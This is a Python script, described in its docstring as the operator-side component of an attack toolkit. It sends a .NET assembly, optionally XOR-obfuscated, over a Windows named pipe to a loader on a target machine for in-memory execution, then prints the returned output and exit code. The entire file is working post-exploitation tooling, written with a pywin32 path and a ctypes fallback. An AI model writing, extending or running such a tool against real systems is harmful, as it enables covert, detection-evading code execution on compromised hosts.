"""
Named Pipe Client — sends a .NET assembly to the pipe listener for in-memory execution.
Usage: python pipe_client.py <pipe_name> <assembly_path> [args...]

This is the operator-side tool: reads an assembly from disk on YOUR machine,
sends the raw bytes over a named pipe to the target's loader, and receives output.
"""

import struct
import sys
import os

def send_assembly(pipe_name: str, assembly_path: str, args: list[str], xor_key: bytes = None):
    """Send an assembly to the named pipe listener and receive output."""

    with open(assembly_path, "rb") as f:
        assembly_bytes = f.read()

    if xor_key:
        assembly_bytes = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(assembly_bytes))

    # Connect to named pipe (Windows)
    pipe_path = rf"\\.\pipe\{pipe_name}"

    try:
        import win32file
        handle = win32file.CreateFile(
            pipe_path,
            win32file.GENERIC_READ | win32file.GENERIC_WRITE,
            0, None,
            win32file.OPEN_EXISTING,
            0, None
        )

        # Send: [4B assembly len][assembly bytes][4B arg count][for each: 4B len + arg bytes]
        win32file.WriteFile(handle, struct.pack("<I", len(assembly_bytes)))
        win32file.WriteFile(handle, assembly_bytes)
        win32file.WriteFile(handle, struct.pack("<I", len(args)))

        for arg in args:
            arg_bytes = arg.encode("utf-8")
            win32file.WriteFile(handle, struct.pack("<I", len(arg_bytes)))
            win32file.WriteFile(handle, arg_bytes)

        # Receive output
        _, output_len_bytes = win32file.ReadFile(handle, 4)
        output_len = struct.unpack("<I", output_len_bytes)[0]
        _, output_bytes = win32file.ReadFile(handle, output_len)
        _, exit_code_bytes = win32file.ReadFile(handle, 4)
        exit_code = struct.unpack("<i", exit_code_bytes)[0]

        print(output_bytes.decode("utf-8", errors="replace"))
        print(f"[*] Exit code: {exit_code}")

        win32file.CloseHandle(handle)
        return exit_code

    except ImportError:
        # Fallback using ctypes for environments without pywin32
        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.windll.kernel32
        GENERIC_READ = 0x80000000
        GENERIC_WRITE = 0x40000000
        OPEN_EXISTING = 3
        INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

        handle = kernel32.CreateFileW(
            pipe_path, GENERIC_READ | GENERIC_WRITE,
            0, None, OPEN_EXISTING, 0, None
        )
        if handle == INVALID_HANDLE_VALUE:
            print(f"[-] Cannot connect to pipe: {pipe_name}")
            return 1

        def write_bytes(h, data):
            written = wintypes.DWORD()
            kernel32.WriteFile(h, data, len(data), ctypes.byref(written), None)

        def read_bytes(h, n):
            buf = ctypes.create_string_buffer(n)
            read = wintypes.DWORD()
            kernel32.ReadFile(h, buf, n, ctypes.byref(read), None)
            return buf.raw[:read.value]

        write_bytes(handle, struct.pack("<I", len(assembly_bytes)))
        write_bytes(handle, assembly_bytes)
        write_bytes(handle, struct.pack("<I", len(args)))
        for arg in args:
            arg_bytes = arg.encode("utf-8")
            write_bytes(handle, struct.pack("<I", len(arg_bytes)))
            write_bytes(handle, arg_bytes)

        output_len = struct.unpack("<I", read_bytes(handle, 4))[0]
        output = read_bytes(handle, output_len)
        exit_code = struct.unpack("<i", read_bytes(handle, 4))[0]

        print(output.decode("utf-8", errors="replace"))
        print(f"[*] Exit code: {exit_code}")

        kernel32.CloseHandle(handle)
        return exit_code


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <pipe_name> <assembly_path> [args...]")
        sys.exit(1)

    pipe_name = sys.argv[1]
    assembly_path = sys.argv[2]
    args = sys.argv[3:]

    if not os.path.exists(assembly_path):
        print(f"[-] Assembly not found: {assembly_path}")
        sys.exit(1)

    exit_code = send_assembly(pipe_name, assembly_path, args)
    sys.exit(exit_code)
